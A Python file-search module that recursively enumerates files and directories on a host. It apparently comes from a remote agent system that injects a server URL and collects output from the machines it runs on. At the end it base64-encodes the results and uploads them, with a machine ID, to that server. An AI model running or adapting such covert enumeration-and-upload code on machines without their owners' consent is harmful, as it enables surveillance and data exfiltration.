# -*- coding: utf-8 -*-
"""
File Search - Search for files by name/pattern
Searches across specified directories
"""
import os
import sys
import json
import base64
import urllib.request
import fnmatch
from datetime import datetime
from pathlib import Path

# Fix stdout encoding for Windows
if sys.platform == 'win32':
    try:
        sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    except:
        pass

# SERVER_URL will be injected by the server when sending the script
try:
    SERVER_URL
except NameError:
    print("ERROR: SERVER_URL not set. Server should inject this variable.")
    sys.exit(1)
PC_ID = os.environ.get("CC_PC_ID", "unknown")

# Import standardized path utilities
try:
    from path_utils import get_base_path
except ImportError:
    import os
    import sys
    def get_base_path():
        if getattr(sys, 'frozen', False):
            return os.path.dirname(sys.executable)
        script_dir = os.path.dirname(os.path.abspath(__file__)) if '__file__' in dir() else os.getcwd()
        if os.path.basename(script_dir) == 'Scripts':
            return os.path.dirname(script_dir)
        return script_dir

# Get search parameters from environment
SEARCH_PATTERN = os.environ.get("SEARCH_PATTERN", "*")
# Default to executable directory (not user home)
SEARCH_PATH = os.environ.get("SEARCH_PATH", get_base_path())
MAX_RESULTS = int(os.environ.get("MAX_RESULTS", "500"))
SEARCH_TYPE = os.environ.get("SEARCH_TYPE", "both")  # files, dirs, both
CASE_SENSITIVE = os.environ.get("CASE_SENSITIVE", "false").lower() == "true"


def safe_str(s):
    """Convert string to ASCII-safe version"""
    if s is None:
        return ""
    try:
        if isinstance(s, bytes):
            s = s.decode('utf-8', errors='replace')
        return s.encode('ascii', 'replace').decode('ascii')
    except:
        return "???"


def format_size(size):
    """Format file size"""
    try:
        if size < 1024:
            return f"{size} B"
        elif size < 1024 * 1024:
            return f"{size / 1024:.1f} KB"
        elif size < 1024 * 1024 * 1024:
            return f"{size / (1024 * 1024):.1f} MB"
        else:
            return f"{size / (1024 * 1024 * 1024):.2f} GB"
    except:
        return "? B"


def matches_pattern(name, pattern):
    """Check if name matches pattern"""
    if not CASE_SENSITIVE:
        name = name.lower()
        pattern = pattern.lower()
    
    # Support wildcards
    if '*' in pattern or '?' in pattern:
        return fnmatch.fnmatch(name, pattern)
    else:
        # Simple substring match
        return pattern in name


def search_files(root_path, pattern, max_results=500):
    """Search for files matching pattern"""
    results = {
        'files': [],
        'directories': [],
        'total_found': 0,
        'searched_paths': 0,
        'errors': []
    }
    
    if not os.path.exists(root_path):
        results['errors'].append(f"Search path does not exist: {root_path}")
        return results
    
    def search_recursive(path):
        """Recursively search directory"""
        if results['total_found'] >= max_results:
            return
        
        try:
            items = os.listdir(path)
            results['searched_paths'] += 1
            
            for item in items:
                if results['total_found'] >= max_results:
                    break
                
                item_path = os.path.join(path, item)
                
                try:
                    if os.path.isdir(item_path):
                        # Skip certain system directories
                        if item in ['$RECYCLE.BIN', 'System Volume Information', 'AppData']:
                            continue
                        
                        if SEARCH_TYPE in ['dirs', 'both']:
                            if matches_pattern(item, pattern):
                                try:
                                    stat = os.stat(item_path)
                                    results['directories'].append({
                                        'name': item,
                                        'path': item_path,
                                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                        'created': datetime.fromtimestamp(stat.st_ctime).isoformat()
                                    })
                                    results['total_found'] += 1
                                except:
                                    pass
                        
                        # Recurse into subdirectory
                        search_recursive(item_path)
                    
                    elif os.path.isfile(item_path):
                        if SEARCH_TYPE in ['files', 'both']:
                            if matches_pattern(item, pattern):
                                try:
                                    stat = os.stat(item_path)
                                    results['files'].append({
                                        'name': item,
                                        'path': item_path,
                                        'size': stat.st_size,
                                        'size_str': format_size(stat.st_size),
                                        'modified': datetime.fromtimestamp(stat.st_mtime).isoformat(),
                                        'created': datetime.fromtimestamp(stat.st_ctime).isoformat(),
                                        'extension': os.path.splitext(item)[1].lower()
                                    })
                                    results['total_found'] += 1
                                except:
                                    pass
                except PermissionError:
                    continue
                except Exception as e:
                    continue
        
        except PermissionError:
            results['errors'].append(f"Permission denied: {path}")
        except Exception as e:
            results['errors'].append(f"Error searching {path}: {str(e)}")
    
    search_recursive(root_path)
    return results


def main():
    print("=" * 70)
    print("   FILE SEARCH")
    print("=" * 70)
    print(f"   Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"   Pattern: {safe_str(SEARCH_PATTERN)}")
    print(f"   Search Path: {safe_str(SEARCH_PATH)}")
    print(f"   Type: {SEARCH_TYPE}")
    print(f"   Max Results: {MAX_RESULTS}")
    print(f"   Case Sensitive: {CASE_SENSITIVE}")
    print("=" * 70)
    
    print(f"\n[*] Searching...")
    results = search_files(SEARCH_PATH, SEARCH_PATTERN, MAX_RESULTS)
    
    print(f"[OK] Search complete!")
    print(f"     Found: {results['total_found']} items")
    print(f"     Files: {len(results['files'])}")
    print(f"     Directories: {len(results['directories'])}")
    print(f"     Searched paths: {results['searched_paths']}")
    
    if results.get('errors'):
        print(f"     Errors: {len(results['errors'])}")
    
    # Display results
    if results['files']:
        print("\n[*] Files Found:")
        print("-" * 70)
        for f in results['files'][:50]:  # Show first 50
            print(f"  {f['size_str']:>10}  {safe_str(f['name'])}")
            print(f"              {safe_str(f['path'])}")
        if len(results['files']) > 50:
            print(f"\n  ... and {len(results['files']) - 50} more files")
    
    if results['directories']:
        print("\n[*] Directories Found:")
        print("-" * 70)
        for d in results['directories'][:20]:  # Show first 20
            print(f"  [DIR]  {safe_str(d['name'])}")
            print(f"         {safe_str(d['path'])}")
        if len(results['directories']) > 20:
            print(f"\n  ... and {len(results['directories']) - 20} more directories")
    
    # Upload results
    try:
        json_data = {
            'search_time': datetime.now().isoformat(),
            'pattern': SEARCH_PATTERN,
            'search_path': SEARCH_PATH,
            'results': results
        }
        
        json_str = json.dumps(json_data, indent=2, ensure_ascii=True)
        json_bytes = json_str.encode('utf-8')
        json_base64 = base64.b64encode(json_bytes).decode('utf-8')
        
        upload_data = {
            "pc_id": PC_ID,
            "filename": f"file_search_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json",
            "content_base64": json_base64,
            "original_path": SEARCH_PATH
        }
        
        data = json.dumps(upload_data).encode('utf-8')
        req = urllib.request.Request(
            f"{SERVER_URL}/upload/base64",
            data=data,
            headers={"Content-Type": "application/json"}
        )
        
        with urllib.request.urlopen(req, timeout=60) as response:
            upload_result = json.loads(response.read().decode('utf-8'))
            print(f"\n[*] Results uploaded to server (ID: {upload_result.get('file_id', 'unknown')})")
    except Exception as e:
        print(f"[!] Upload error: {safe_str(str(e))}")
    
    print("\n" + "=" * 70)
    print("[OK] File search complete!")
    print("=" * 70)


if __name__ == '__main__':
    try:
        main()
    except Exception as e:
        print(f"[FATAL ERROR] {safe_str(str(e))}")

